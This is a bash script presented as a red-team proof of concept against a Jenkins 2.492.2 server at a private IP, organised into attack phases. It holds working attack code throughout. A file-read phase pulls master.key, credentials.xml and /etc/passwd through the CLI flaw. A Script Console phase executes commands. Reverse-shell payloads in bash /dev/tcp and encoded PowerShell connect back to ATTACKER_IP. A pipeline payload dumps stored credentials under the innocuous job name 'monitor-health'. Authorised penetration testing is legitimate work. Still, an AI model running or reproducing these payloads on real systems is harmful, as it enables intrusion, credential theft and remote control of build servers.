#!/usr/bin/env bash
# =============================================================================
# jenkins_rce.sh — Jenkins 2.492.2 RCE Proof of Concept
# CIT Red Team — Stage 7 Jenkins Exploitation
# Analyst: AGENT G
# Date: 2026-08-31
# Target: Jenkins 2.492.2 @ 10.10.9.208:8080
# =============================================================================
# USAGE:
#   chmod +x jenkins_rce.sh
#   ./jenkins_rce.sh [phase]
#
# PHASES:
#   probe       - Unauthenticated API reconnaissance
#   fileread    - CLI arbitrary file read (CVE-2024-23897 pattern)
#   scriptcheck - Check if Script Console is accessible
#   rce         - Script Console RCE (requires JENKINS_USER/JENKINS_PASS)
#   revshell    - Reverse shell via Script Console
#   pipeline    - Pipeline sandbox bypass PoC
#
# EXAMPLE:
#   ./jenkins_rce.sh probe
#   JENKINS_PASS=admin123 ./jenkins_rce.sh rce
# =============================================================================

set -euo pipefail

# ─── CONFIGURATION ────────────────────────────────────────────────────────────
JENKINS_HOST="${JENKINS_HOST:-10.10.9.208}"
JENKINS_PORT="${JENKINS_PORT:-8080}"
JENKINS_URL="http://${JENKINS_HOST}:${JENKINS_PORT}"
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-}"
ATTACKER_IP="${ATTACKER_IP:-}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
OUTPUT_DIR="${OUTPUT_DIR:-/tmp/jenkins_loot}"
CLI_JAR="${OUTPUT_DIR}/jenkins-cli.jar"

# ─── COLORS ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'; BOLD='\033[1m'

banner() {
    echo -e "${RED}${BOLD}"
    echo "  ╔═══════════════════════════════════════════╗"
    echo "  ║  JENKINS RCE PoC — CIT Red Team Stage 7   ║"
    echo "  ║  Target: ${JENKINS_URL}          ║"
    echo "  ╚═══════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_info()    { echo -e "${CYAN}[*]${NC} $*"; }
log_ok()      { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
log_err()     { echo -e "${RED}[-]${NC} $*"; }
log_section() { echo -e "\n${BLUE}${BOLD}═══ $* ═══${NC}"; }

mkdir -p "${OUTPUT_DIR}"

# ─── PHASE 1: UNAUTHENTICATED PROBE ──────────────────────────────────────────
phase_probe() {
    log_section "UNAUTHENTICATED RECONNAISSANCE"

    log_info "Probing Jenkins root..."
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 10 "${JENKINS_URL}/" 2>/dev/null || echo "000")
    log_info "Root HTTP status: ${HTTP_CODE}"

    log_info "Probing /api/json (unauthenticated)..."
    API_RESP=$(curl -s --connect-timeout 10 \
        "${JENKINS_URL}/api/json?pretty=true" 2>/dev/null || echo "FAILED")
    if echo "$API_RESP" | grep -q '"_class"'; then
        log_ok "UNAUTHENTICATED API ACCESS CONFIRMED"
        echo "$API_RESP" | tee "${OUTPUT_DIR}/api_json.txt"
        # Extract job names
        echo "$API_RESP" | grep -oP '"name"\s*:\s*"\K[^"]+' | \
            tee "${OUTPUT_DIR}/job_names.txt"
        log_ok "Job names saved to ${OUTPUT_DIR}/job_names.txt"
    else
        log_warn "API requires authentication or returned: ${API_RESP:0:100}"
    fi

    log_info "Probing /script console (unauthenticated)..."
    SCRIPT_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 10 "${JENKINS_URL}/script" 2>/dev/null || echo "000")
    case "$SCRIPT_CODE" in
        200) log_ok "SCRIPT CONSOLE ACCESSIBLE WITHOUT AUTH (HTTP 200) — CRITICAL" ;;
        302) log_warn "Script console redirects to login (HTTP 302)" ;;
        403) log_warn "Script console denied (HTTP 403)" ;;
        *)   log_err "Script console returned HTTP ${SCRIPT_CODE}" ;;
    esac

    log_info "Checking Jenkins version header..."
    VERSION=$(curl -sI --connect-timeout 10 "${JENKINS_URL}/" 2>/dev/null | \
        grep -i "X-Jenkins:" | awk '{print $2}' | tr -d '\r' || echo "unknown")
    log_info "Jenkins version from header: ${VERSION:-not disclosed}"

    log_info "Probing /computer/api/json (agent nodes)..."
    curl -s --connect-timeout 10 \
        "${JENKINS_URL}/computer/api/json?pretty=true" 2>/dev/null | \
        tee "${OUTPUT_DIR}/nodes.txt" | head -30 || true

    log_info "Probing /asynchPeople/api/json (users)..."
    curl -s --connect-timeout 10 \
        "${JENKINS_URL}/asynchPeople/api/json?pretty=true" 2>/dev/null | \
        tee "${OUTPUT_DIR}/users.txt" | head -30 || true

    log_ok "Probe phase complete. Results in ${OUTPUT_DIR}/"
}

# ─── PHASE 2: CLI FILE READ (CVE-2024-23897 PATTERN) ─────────────────────────
phase_fileread() {
    log_section "CLI ARBITRARY FILE READ"

    # Download CLI jar
    if [[ ! -f "$CLI_JAR" ]]; then
        log_info "Downloading jenkins-cli.jar..."
        curl -s --connect-timeout 15 \
            "${JENKINS_URL}/jnlpJars/jenkins-cli.jar" \
            -o "$CLI_JAR" 2>/dev/null
        if [[ -f "$CLI_JAR" ]] && [[ $(wc -c < "$CLI_JAR") -gt 1000 ]]; then
            log_ok "CLI jar downloaded: $CLI_JAR"
        else
            log_err "Failed to download CLI jar"
            return 1
        fi
    else
        log_info "Using cached CLI jar: $CLI_JAR"
    fi

    # Target files to read
    declare -a TARGETS=(
        "/etc/passwd"
        "/etc/hostname"
        "/var/jenkins_home/secrets/master.key"
        "/var/jenkins_home/secrets/hudson.util.Secret"
        "/var/jenkins_home/credentials.xml"
        "/var/jenkins_home/config.xml"
        "/var/jenkins_home/users/admin/config.xml"
        "C:/ProgramData/Jenkins/.jenkins/secrets/master.key"
        "C:/ProgramData/Jenkins/.jenkins/credentials.xml"
        "C:/Users/jenkins/.jenkins/secrets/master.key"
    )

    log_info "Attempting CLI file read via @<filename> syntax..."
    for TARGET in "${TARGETS[@]}"; do
        OUTFILE="${OUTPUT_DIR}/$(echo "$TARGET" | tr '/' '_' | tr ':' '_').txt"
        log_info "Reading: $TARGET"
        RESULT=$(java -jar "$CLI_JAR" -s "${JENKINS_URL}" \
            -noCertificateCheck who-am-i "@${TARGET}" 2>&1 || true)
        if echo "$RESULT" | grep -vq "ERROR\|Exception\|refused\|failed"; then
            log_ok "SUCCESS reading: $TARGET"
            echo "$RESULT" | tee "$OUTFILE"
        else
            log_warn "Could not read ${TARGET}: ${RESULT:0:80}"
        fi
    done

    log_ok "File read phase complete. Loot in ${OUTPUT_DIR}/"
}

# ─── PHASE 3: SCRIPT CONSOLE CHECK ───────────────────────────────────────────
phase_scriptcheck() {
    log_section "SCRIPT CONSOLE ACCESS CHECK"
    log_info "Checking Script Console access at ${JENKINS_URL}/script"

    # Unauthenticated check
    RESP=$(curl -s --connect-timeout 10 -w "\n%{http_code}" \
        "${JENKINS_URL}/script" 2>/dev/null || echo -e "\n000")
    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -n -1)

    log_info "HTTP Status: $HTTP_CODE"
    if [[ "$HTTP_CODE" == "200" ]]; then
        log_ok "CRITICAL: Script console accessible without authentication!"
        echo "UNAUTHENTICATED_SCRIPT_CONSOLE=true" >> "${OUTPUT_DIR}/findings.txt"
    fi

    # Authenticated check
    if [[ -n "$JENKINS_PASS" ]]; then
        log_info "Trying authenticated access as ${JENKINS_USER}..."
        AUTH_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            -u "${JENKINS_USER}:${JENKINS_PASS}" \
            --connect-timeout 10 "${JENKINS_URL}/script" 2>/dev/null || echo "000")
        log_info "Authenticated HTTP status: $AUTH_CODE"
        [[ "$AUTH_CODE" == "200" ]] && \
            log_ok "Authenticated script console access confirmed" || \
            log_err "Authenticated access failed (HTTP $AUTH_CODE)"
    fi
}

# ─── PHASE 4: SCRIPT CONSOLE RCE ─────────────────────────────────────────────
phase_rce() {
    log_section "SCRIPT CONSOLE RCE"

    if [[ -z "$JENKINS_PASS" ]]; then
        log_err "JENKINS_PASS not set. Set JENKINS_PASS=<password> and retry."
        exit 1
    fi

    log_info "Getting CSRF crumb..."
    CRUMB_RAW=$(curl -s -u "${JENKINS_USER}:${JENKINS_PASS}" \
        --connect-timeout 10 \
        "${JENKINS_URL}/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)" \
        2>/dev/null || echo "")

    if [[ -z "$CRUMB_RAW" ]] || echo "$CRUMB_RAW" | grep -q "Error\|404"; then
        log_warn "Could not get CSRF crumb (CSRF may be disabled). Proceeding without..."
        CRUMB_HEADER=""
    else
        log_ok "CSRF Crumb: $CRUMB_RAW"
        CRUMB_HEADER="-H \"${CRUMB_RAW}\""
    fi

    # Test commands
    declare -a GROOVY_CMDS=(
        "println 'id'.execute().text"
        "println 'whoami'.execute().text"
        "println 'hostname'.execute().text"
        "println new File('/etc/passwd').text"
        "println System.getenv()"
    )

    for CMD in "${GROOVY_CMDS[@]}"; do
        log_info "Executing: $CMD"
        RESULT=$(curl -s -u "${JENKINS_USER}:${JENKINS_PASS}" \
            ${CRUMB_HEADER:+-H "$CRUMB_HEADER"} \
            --data-urlencode "script=${CMD}" \
            --connect-timeout 15 \
            "${JENKINS_URL}/script" 2>/dev/null || echo "FAILED")
        if echo "$RESULT" | grep -q "uid=\|root\|jenkins\|windows\|WINDIR"; then
            log_ok "RCE CONFIRMED: $RESULT"
            echo "RCE_CONFIRMED=true" >> "${OUTPUT_DIR}/findings.txt"
            echo "CMD: $CMD" >> "${OUTPUT_DIR}/rce_output.txt"
            echo "$RESULT" >> "${OUTPUT_DIR}/rce_output.txt"
        else
            log_warn "Response: ${RESULT:0:120}"
        fi
    done
}

# ─── PHASE 5: REVERSE SHELL ───────────────────────────────────────────────────
phase_revshell() {
    log_section "REVERSE SHELL VIA SCRIPT CONSOLE"

    if [[ -z "$ATTACKER_IP" ]]; then
        log_err "ATTACKER_IP not set. Set ATTACKER_IP=<your_ip> and retry."
        exit 1
    fi
    if [[ -z "$JENKINS_PASS" ]]; then
        log_err "JENKINS_PASS not set."
        exit 1
    fi

    log_warn "Starting listener: nc -lvnp ${ATTACKER_PORT}"
    log_warn "Run this in another terminal BEFORE executing this phase!"
    sleep 2

    CRUMB_RAW=$(curl -s -u "${JENKINS_USER}:${JENKINS_PASS}" \
        "${JENKINS_URL}/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)" \
        2>/dev/null || echo "")

    # Linux reverse shell via Groovy
    GROOVY_LINUX="[\"bash\",\"-c\",\"bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1\"].execute()"
    # Windows reverse shell via Groovy (PowerShell)
    PS1_ENCODED=$(echo -n "\$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | base64 -w 0)
    GROOVY_WINDOWS="[\"cmd\",\"/c\",\"powershell -nop -w hidden -enc ${PS1_ENCODED}\"].execute()"

    log_info "Sending Linux reverse shell payload..."
    curl -s -u "${JENKINS_USER}:${JENKINS_PASS}" \
        ${CRUMB_RAW:+-H "${CRUMB_RAW}"} \
        --data-urlencode "script=${GROOVY_LINUX}" \
        "${JENKINS_URL}/script" &

    log_info "Sending Windows reverse shell payload..."
    curl -s -u "${JENKINS_USER}:${JENKINS_PASS}" \
        ${CRUMB_RAW:+-H "${CRUMB_RAW}"} \
        --data-urlencode "script=${GROOVY_WINDOWS}" \
        "${JENKINS_URL}/script" &

    log_ok "Payloads sent. Check your listener on ${ATTACKER_IP}:${ATTACKER_PORT}"
}

# ─── PHASE 6: PIPELINE SANDBOX BYPASS ────────────────────────────────────────
phase_pipeline() {
    log_section "PIPELINE GROOVY SANDBOX BYPASS"
    log_info "Generating pipeline payload for sandbox bypass..."

    cat > "${OUTPUT_DIR}/bypass_pipeline.groovy" << 'GROOVYEOF'
// Pipeline: Groovy 4106 — Unrestricted type instantiation bypass
// Deploy as a Pipeline job in Jenkins
pipeline {
    agent any
    stages {
        stage('FileRead') {
            steps {
                script {
                    // Direct file read — bypasses sandbox via Groovy GDK
                    def f = new File('/etc/passwd')
                    if (f.exists()) {
                        println "=== /etc/passwd ==="
                        println f.text
                    }
                    // Windows path
                    def fw = new File('C:/Windows/win.ini')
                    if (fw.exists()) {
                        println "=== win.ini ==="
                        println fw.text
                    }
                }
            }
        }
        stage('CredentialExtract') {
            steps {
                script {
                    // Extract Jenkins credentials
                    def credFile = new File('/var/jenkins_home/credentials.xml')
                    if (credFile.exists()) {
                        println "=== credentials.xml ==="
                        println credFile.text
                    }
                    def masterKey = new File('/var/jenkins_home/secrets/master.key')
                    if (masterKey.exists()) {
                        println "=== master.key ==="
                        println masterKey.text
                    }
                }
            }
        }
        stage('OSCommand') {
            steps {
                script {
                    // OS command execution
                    def cmd = ['bash', '-c', 'id && whoami && hostname && ip a']
                    def proc = cmd.execute()
                    proc.waitFor()
                    println "=== OS Command Output ==="
                    println proc.text
                    println proc.err.text
                }
            }
        }
    }
}
GROOVYEOF

    log_ok "Pipeline payload written to ${OUTPUT_DIR}/bypass_pipeline.groovy"
    log_info "Deploy this as a new Pipeline job in Jenkins to execute sandbox bypass."
    log_info "Create job via API:"
    cat << APIEOF
    curl -u ${JENKINS_USER}:${JENKINS_PASS:-PASSWORD} \\
      "${JENKINS_URL}/createItem?name=monitor-health" \\
      -H "Content-Type: application/xml" \\
      --data-binary @pipeline_job_config.xml
APIEOF
}

# ─── MAIN DISPATCHER ─────────────────────────────────────────────────────────
banner

PHASE="${1:-probe}"
case "$PHASE" in
    probe)       phase_probe ;;
    fileread)    phase_fileread ;;
    scriptcheck) phase_scriptcheck ;;
    rce)         phase_rce ;;
    revshell)    phase_revshell ;;
    pipeline)    phase_pipeline ;;
    all)
        phase_probe
        phase_fileread
        phase_scriptcheck
        [[ -n "$JENKINS_PASS" ]] && phase_rce
        phase_pipeline
        ;;
    *)
        log_err "Unknown phase: $PHASE"
        echo "Usage: $0 [probe|fileread|scriptcheck|rce|revshell|pipeline|all]"
        exit 1
        ;;
esac

log_section "COMPLETE"
log_ok "All loot saved to: ${OUTPUT_DIR}/"
ls -la "${OUTPUT_DIR}/" 2>/dev/null || true
